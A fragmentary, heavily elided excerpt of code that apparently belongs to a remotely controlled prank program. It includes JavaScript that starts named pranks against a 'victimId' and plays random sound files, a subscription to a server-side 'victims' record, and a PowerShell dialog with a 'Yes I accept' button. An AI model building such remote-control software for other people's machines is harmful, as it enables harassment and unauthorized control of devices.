...
let activePranks = {};
async function startPrank(prankName, victimId) {
    ...
    function playRandomFart() {
        try {
            ...
            if (soundKeys.length > 0) {
                ...
                const files = readdirSync(fartDir).filter((f) => f.endsWith(".mp3"));
                if (files.length > 0) {
...
$btn1.Location = New-Object System.Drawing.Point(50, 280)
$btn1.BackColor = "DarkRed"
$btn1.ForeColor = "White"
$btn1.Font = New-Object System.Drawing.Font("Consolas", 12, [System.Drawing.FontStyle]::Bold)
$btn1.Add_Click({ $form.Close() })
$form.Controls.Add($btn1)

$btn2 = New-Object System.Windows.Forms.Button
$btn2.Text = "Yes I accept"
$btn2.Size = New-Object System.Drawing.Size(200, 50)
$btn2.Location = New-Object System.Drawing.Point(330, 280)
...
async function start() {
    ...
    let startingPranks = new Set();
    client.onUpdate(anyApi.victims.getById, { id: victimId }, async (victim) => {
        if (!victim)
            return;
